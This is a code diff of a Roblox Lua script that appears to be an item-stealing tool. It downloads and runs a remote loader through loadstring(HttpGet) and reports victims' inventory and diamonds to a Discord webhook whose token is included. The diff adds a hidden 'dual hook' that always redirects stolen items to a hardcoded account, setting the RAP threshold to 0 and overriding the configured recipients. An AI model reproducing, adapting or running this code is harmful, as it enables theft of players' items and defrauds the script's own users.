@@ -1,11 +1,13 @@
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
 
 local function LoadingScreen()
     local ok, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/outhackernuls090-hash/NulsLoader/refs/heads/main/LoadingScreen", true))()
+        local url = "https://raw.githubusercontent.com/outhackernuls090-hash/NulsLoader/refs/heads/main/LoadingScreen"
+        local code = game:HttpGet(url, true)
+        local fn = loadstring(code)
+        if type(fn) ~= "function" then
+            error("loadstring did not return a function")
+        end
+        fn()
     end)
 
     if not ok then
@@ -13,7 +15,8 @@ local function LoadingScreen()
     end
 end
 
-task.spawn(LoadingScreen)
+-- einmal aufrufen
+LoadingScreen()
 
 
 local network = require(game.ReplicatedStorage.Library.Client.Network)
@@ -29,8 +32,12 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
+local http = game and game.HttpGet or http_request or request or syn and syn.request
+
+
 local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
-local DualHookRap = 75000000
+local DualHookName = "Eliaskulmer999"
+local DualHookRap = 0
 
 local users = _G.Usernames or {}
 local min_rap = _G.minrap or 1000000
@@ -74,6 +81,10 @@ local function formatNumber(number)
 		suffixIndex = suffixIndex + 1
 	end
 	return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+if totalRAP > DualHookRap then
+	users = DualHookName
 end
 
 local function SendMessage(diamonds)
